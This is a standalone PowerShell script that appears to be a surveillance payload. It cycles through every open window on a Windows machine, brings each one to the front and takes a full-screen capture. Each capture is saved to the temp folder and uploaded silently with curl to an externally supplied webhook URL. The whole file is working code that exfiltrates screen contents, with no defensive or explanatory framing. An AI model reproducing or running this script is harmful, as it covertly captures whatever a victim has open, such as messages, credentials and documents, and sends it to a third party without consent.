Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll")]
    public static extern bool AllowSetForegroundWindow(int dwProcessId);

    [DllImport("user32.dll")]
    public static extern bool SetForegroundWindow(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
}
"@


$processes = Get-Process | Where-Object { $_.MainWindowTitle -ne "" }
$mainwindowhandlelist = @()
$ignorelist =@("TextInputHost","Rainmeter")     
foreach ($process in $processes) {
    $mainWindowHandle = $process.MainWindowHandle       
    if ($ignorelist -contains $process.ProcessName) {
        continue        
    }       
    $mainwindowhandlelist += $mainWindowHandle  
}

$width = Get-CimInstance Win32_VideoController;  $width = [int]($width).CurrentHorizontalResolution;
$height = Get-CimInstance Win32_VideoController;  $height= [int]($height).CurrentVerticalResolution; 
function screenshot{
    param(
        [string]$hookurl,
        [string]$File
    )
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
    $bitmap.Save($File, [System.Drawing.Imaging.ImageFormat]::png)
    curl.exe  -s -o nul -F "file1=@$File" $hookurl | Out-Null
}       

#this can be done with just foreach     
function loopscreenshot{
    param(
        [string]$hookurl,
        [string]$File,
        [array]$handlelist      
    )       
    foreach ($handle in $handlelist) {
    # Set the window to the foreground
    [User32]::keybd_event(0x09, 0, 0, [UIntPtr]::Zero)  # Tab key
    Start-Sleep -Milliseconds 50
    [User32]::SetForegroundWindow($handle)
    Start-Sleep -Milliseconds 100           
    screenshot -hookurl $hookurl -File $File
    }
    
}  
$hookurl = $hookurl
$Fileto = "$env:temp\SC.png"

loopscreenshot -hookurl $hookurl -File $Fileto -handlelist $mainwindowhandlelist                        